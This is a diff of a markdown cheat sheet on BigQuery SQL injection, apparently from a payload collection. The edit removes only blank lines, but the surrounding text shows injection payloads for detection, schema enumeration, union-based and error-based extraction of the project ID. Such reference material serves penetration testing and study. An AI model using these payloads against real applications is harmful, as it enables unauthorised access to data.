@@ -12,7 +12,6 @@
 * [BigQuery Time Based](#bigquery-time-based)
 * [References](#references)
 
-
 ## Detection
 
 * Use a classic single quote to trigger an error: `'`
@@ -24,14 +23,12 @@
 | `SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA` | Gathering all dataset names |
 | `select * from project_id.dataset_name.table_name`    | Gathering data from specific project id & dataset |
 
-
 ## BigQuery Comment
 
 | Type                       | Description                       |
 |----------------------------|-----------------------------------|
 | `#`                        | Hash comment                      |
 | `/* PostgreSQL Comment */` | C-style comment                   |
-
 
 ## BigQuery Union Based
 
@@ -49,7 +46,6 @@ true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,
 | `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | Division by zero     |
 | `select CAST(@@project_id AS INT64)`                     | Casting              |
 
-
 ## BigQuery Boolean Based
 
 ```ps1
@@ -59,7 +55,6 @@ true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,
 ## BigQuery Time Based
 
 * Time based functions does not exist in the BigQuery syntax.
-
 
 ## References
 
